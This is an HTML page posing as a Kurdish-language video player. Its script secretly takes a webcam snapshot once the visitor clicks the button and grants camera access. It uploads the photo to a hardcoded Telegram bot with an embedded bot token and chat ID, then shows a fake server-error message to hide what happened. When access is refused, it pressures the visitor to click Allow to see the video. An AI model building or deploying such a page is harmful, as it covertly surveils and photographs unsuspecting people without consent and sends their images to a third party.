<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;600&family=Reem+Kufi:wght@500&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #121212;
            /* باگراوەندی دیواری بەردین */
            background-image: 
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px),
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px);
            background-size: 58px 58px;
            background-position: 0px 2px, 4px 35px, 29px 31px, 34px 6px;
            font-family: 'IBM Plex Sans Arabic', sans-serif;
            text-align: center;
            overflow: hidden;
        }

        #main-container {
            /* ستایلی شووشەیی (Frosted Glass) */
            background: rgba(255, 255, 255, 0.05);
            padding: 50px 30px;
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            width: 85%;
            max-width: 340px;
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
        }

        h2 {
            color: #ffffff;
            margin-bottom: 40px;
            font-size: 32px;
            font-family: 'Reem Kufi', sans-serif; /* فۆنتی شیک بۆ ئەزیزن */
            font-weight: 500;
            text-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }

        #startBtn {
            padding: 15px 50px;
            font-size: 20px;
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            /* دوگمەی شووشەیی ڕووناک */
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            font-weight: 600;
            cursor: pointer;
            font-family: 'IBM Plex Sans Arabic', sans-serif;
            transition: all 0.3s ease;
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        #startBtn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-3px);
            border: 1px solid rgba(255, 255, 255, 0.5);
        }

        #startBtn:active {
            transform: scale(0.95);
        }

        #status {
            color: #cccccc;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ئـــەزیــزن🩶</h2>
        <button id="startBtn">کلیککردن</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "...کەمێک چاوەڕێ بکە";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
